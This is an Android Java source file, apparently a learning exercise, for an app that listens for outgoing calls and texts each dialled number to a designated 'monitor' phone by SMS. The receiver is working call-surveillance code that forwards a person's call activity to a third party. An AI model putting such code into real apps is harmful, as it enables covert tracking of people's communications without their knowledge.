package com.example.sharkj.tophonelistener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.widget.Toast;

/**
 * Created by sharkj on 2017/12/6.
 */

class ToPhoneListenerReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        //如果检测到监控者手机向外拨打电话的时候，进行判断是否需要采取去电监控
        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            Toast.makeText(context, "正在处理去电操作", Toast.LENGTH_LONG).show();
//            新知识点：获得去电号码
            String toPhonrNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            //            判端去电号码是否为短号
            if (toPhonrNumber.length() == 4) {
                toPhonrNumber = "1555521" + toPhonrNumber;
            }
//            判断监控者手机号码是否为短号
            if (TPLInformations.phoneNumber.length() == 4) {
                TPLInformations.phoneNumber = "1555521" + TPLInformations.phoneNumber;
            }
//            判断去电号码和监控者手机号码是否一致，只有在不一致的情况下，才进行监控
            if (!toPhonrNumber.equals(TPLInformations.phoneNumber)) {
                //        监控其实就是向监控者手机发送一条信息
                //                    获得短信管理器对象
                SmsManager smsManager = SmsManager.getDefault();
                //                    准备短信内容（去向号码+去信内容）
                String message = toPhonrNumber + "is Called Phone to Ta";
                //                    发送短信
                smsManager.sendTextMessage(TPLInformations.phoneNumber, null, message, null, null);
            }


        }
    }
}
